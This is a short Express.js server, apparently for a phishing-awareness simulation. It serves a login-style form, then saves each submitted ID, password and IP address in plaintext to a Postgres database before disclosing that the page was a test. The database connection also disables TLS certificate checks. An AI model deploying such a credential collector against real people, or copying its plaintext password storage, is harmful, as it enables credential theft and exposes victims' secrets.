require("dotenv").config()
const express = require("express")
const { Pool } = require("pg")
const bodyParser = require("body-parser")
const path = require("path")
const app = express()

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
})

app.use(express.static(path.join(__dirname, "public")))
app.use(bodyParser.urlencoded({ extended: true }))
app.use(express.static("public"))

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "form.html"))
})

app.post("/submit", async (req, res) => {
  const { idMat, password } = req.body
  const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress
  try {
    await pool.query(
      "INSERT INTO submissions (idMat, password,ip) VALUES ($1, $2,$3)",
      [idMat, password,ip]
    )

    res.send(`
      <h2>⚠️ This was a phishing simulation.</h2>
      <p>Never enter your credentials into unknown links.</p>
    `)
  } catch (err) {
    console.error(err)
    res.status(500).send("Server error")
  }
})

app.listen(process.env.PORT, () => {
  console.log("Server running on port " + process.env.PORT)
})